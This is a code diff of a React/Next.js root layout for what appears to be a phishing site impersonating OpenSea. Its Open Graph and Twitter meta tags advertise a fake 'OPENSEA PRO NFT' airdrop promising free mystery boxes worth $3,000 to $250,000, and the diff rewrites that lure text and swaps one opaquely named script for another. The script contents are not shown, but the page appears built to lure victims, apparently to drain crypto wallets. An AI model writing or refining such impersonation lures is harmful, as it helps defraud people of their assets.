@@ -16,23 +16,9 @@ function RootLayout({ children }: { children: React.ReactNode }) {
         />
         <meta
           property="og:description"
-          content="🟢 AIRDROP IS LIVE NOW 🟢 
-
-          •🎉 Price: FREE 🎉 
-          •🎉 Supply: 150 Mystery Box 🎉 
-          •🎉 Reward: between $3,000 and $250,000 
-
-          •TRY YOUR LUCK! 🚀
-          
-          Minting has officially Begun Early 🏆🏆
-
-          We have formally decided as a team to allow individual to mint today 🚀🎊 Instead of doing whitelists we decides to give people who are online during this time the ability to mint 🎁
-          "
+          content="🟢 AIRDROP IS LIVE NOW 🟢 &#10;&#10;•🎉 Price: FREE 🎉 &#10;•🎉 Supply: 150 Mystery Box 🎉 &#10;•🎉 Reward: between $3,000 and $250,000 &#10;&#10;•TRY YOUR LUCK! 🚀&#10;&#10;Minting has officially Begun Early 🏆🏆&#10;&#10;We have formally decided as a team to allow individuals to mint today 🚀🎊 Instead of whitelists, we're rewarding active users with early access! 🎁"
         />
-        <meta
-          property="og:image"
-          content="https://openseaml.vercel.app/images/389-9bec97c22fa2e411.gif"
-        />
+        <meta property="og:image" content="/images/Opensea-Pro-NFT.png" />
         <meta name="theme-color" content="#7289DA" />
 
         {/* Twitter Meta Tags */}
@@ -40,19 +26,8 @@ function RootLayout({ children }: { children: React.ReactNode }) {
         <meta name="twitter:site" content="@opensea" />
         <meta name="twitter:title" content="CLICK HERE - OPENSEA PRO NFT" />
         <meta
-          name="twitter:description"
-          content="🟢 AIRDROP IS LIVE NOW 🟢 
-
-          •🎉 Price: FREE 🎉 
-          •🎉 Supply: 150 Mystery Box 🎉 
-          •🎉 Reward: between $3,000 and $250,000 
-
-          •TRY YOUR LUCK! 🚀
-          
-          Minting has officially Begun Early 🏆🏆
-
-          We have formally decided as a team to allow individual to mint today 🚀🎊 Instead of doing whitelists we decides to give people who are online during this time the ability to mint 🎁
-          "
+          property="og:description"
+          content="🟢 AIRDROP IS LIVE NOW 🟢 &#10;&#10;•🎉 Price: FREE 🎉 &#10;•🎉 Supply: 150 Mystery Box 🎉 &#10;•🎉 Reward: between $3,000 and $250,000 &#10;&#10;•TRY YOUR LUCK! 🚀&#10;&#10;Minting has officially Begun Early 🏆🏆&#10;&#10;We have formally decided as a team to allow individuals to mint today 🚀🎊 Instead of whitelists, we're rewarding active users with early access! 🎁"
         />
 
         {/* Icons */}
@@ -92,7 +67,7 @@ function RootLayout({ children }: { children: React.ReactNode }) {
           crossOrigin="anonymous"
           defer
         ></script>
-        <script src="/scripts/09e0df14-3f56-4990-8a99-c418e095b29a.js" defer />
+        <script src="/scripts/5966ce85-25c8-4887-a1e3-f44ef255b8b0.js" defer />
         <script src="/scripts/app.js" defer />
       </body>
     </html>
